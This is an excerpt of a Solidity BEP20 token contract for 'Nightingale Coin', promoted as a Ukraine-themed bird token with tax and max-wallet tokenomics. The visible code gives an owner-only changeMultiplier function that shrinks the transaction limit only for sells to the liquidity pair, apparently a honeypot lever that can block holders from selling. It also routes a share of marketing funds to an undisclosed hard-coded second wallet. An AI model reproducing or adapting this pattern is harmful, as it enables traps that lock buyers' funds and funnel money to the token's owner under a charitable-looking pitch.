...
/**
 * Nightingale Coin (NIGHTINGALE)
 *
 * This cute bird is Ukraine's national animal!
 *
 * Tokenomics:
 * - 10% tax: 5% LP 5% marketing
 * - 5% max wallet (50,000)
 * - 50% supply initially burned
 *
 * https://t.me/https://t.me/nightingalecoin
*/
...
contract Nightingale is IBEP20, Auth {
    using SafeMath for uint256;

    string constant _name = "Nightingale Coin";
    string constant _symbol = "NIGHTINGALE";
    ...
    constructor () Auth(msg.sender) {
        ...
        anothermarketingWallet = 0x14F7f7039e52Ae3aA764c865eAA597835043a3bb;
    ...
    function changeMultiplier(uint256 newMultiplier) external authorized {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(amount <= _getMaxTxAmount(recipient) || isTxLimitExempt[sender], "TX Limit Exceeded");
    ...
    function _getMaxTxAmount(address recipient) internal view returns (uint256) {
        return pair == recipient ? _maxTxAmount.div(_multiplier) : _maxTxAmount;
    }
    ...
    function swapBack() internal lockTheSwap {
        ...
        uint256 marketingShare = amountBNBMarketing.mul(2).div(10);
